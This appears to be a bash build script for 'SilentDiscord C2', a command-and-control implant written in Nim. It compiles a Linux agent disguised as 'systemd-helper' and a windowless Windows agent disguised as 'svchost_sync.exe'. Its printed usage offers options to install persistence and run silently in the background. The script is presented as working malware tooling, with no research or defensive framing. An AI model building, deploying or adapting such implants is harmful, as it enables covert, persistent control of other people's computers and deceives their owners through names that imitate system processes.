#!/bin/bash

echo "========================================"
echo "  SilentDiscord C2 - Build Script"
echo "========================================"
echo

# Check for Nim
if ! command -v nim &> /dev/null; then
    echo "[!] Nim not found! Please install Nim from https://nim-lang.org"
    exit 1
fi

# Clean
echo "[*] Cleaning previous builds..."
rm -rf bin/
mkdir -p bin

# Build Linux agent
echo "[*] Building Linux agent..."
nim c -d:release -d:strip -d:ssl --opt:size -o:bin/systemd-helper src/main.nim

if [ $? -eq 0 ]; then
    echo "[+] Linux agent built: bin/systemd-helper"
    echo "    Size: $(stat -c%s bin/systemd-helper) bytes"
else
    echo "[!] Linux build failed"
fi

# Cross-compile for Windows (if mingw available)
if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "[*] Cross-compiling Windows agent..."
    nim c -d:release -d:strip -d:ssl --opt:size --app:gui \
      --cpu:amd64 --os:windows \
      --gcc.exe=x86_64-w64-mingw32-gcc \
      --gcc.linkerexe=x86_64-w64-mingw32-gcc \
      -o:bin/svchost_sync.exe src/main.nim
    
    if [ $? -eq 0 ]; then
        echo "[+] Windows agent built: bin/svchost_sync.exe"
    fi
fi

echo
echo "========================================"
echo "  Build Complete"
echo "========================================"
echo
echo "Usage:"
echo "  ./bin/systemd-helper --install     (install persistence)"
echo "  ./bin/systemd-helper --silent      (run in background)"
echo